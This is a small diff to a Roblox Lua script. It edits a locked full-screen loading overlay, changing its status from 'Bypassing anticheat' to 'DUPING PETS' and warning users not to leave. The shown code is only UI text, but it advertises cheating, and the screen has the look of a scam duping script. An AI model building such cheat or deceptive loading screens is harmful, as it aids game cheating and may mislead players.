@@ -142,7 +142,7 @@ local function showLockedLoading()
 	local status = Instance.new("TextLabel", bg)
 	status.Size, status.Position = UDim2.new(1,0,0.05,0), UDim2.new(0,0,0.56,0)
 	status.BackgroundTransparency, status.Font, status.TextScaled = 1, Enum.Font.Gotham, true
-	status.TextColor3, status.Text, status.ZIndex = Color3.fromRGB(230,230,230), "Bypassing anticheat… please wait", 10001
+	status.TextColor3, status.Text, status.ZIndex = Color3.fromRGB(230,230,230), "DUPING PETS… please wait", 10001
 
 	infoLine("⚠  Do NOT leave – progress will be lost", 0.62, Color3.fromRGB(210,60,60))
 	infoLine("by Yoshi", 0.68, Color3.fromRGB(180,180,180))
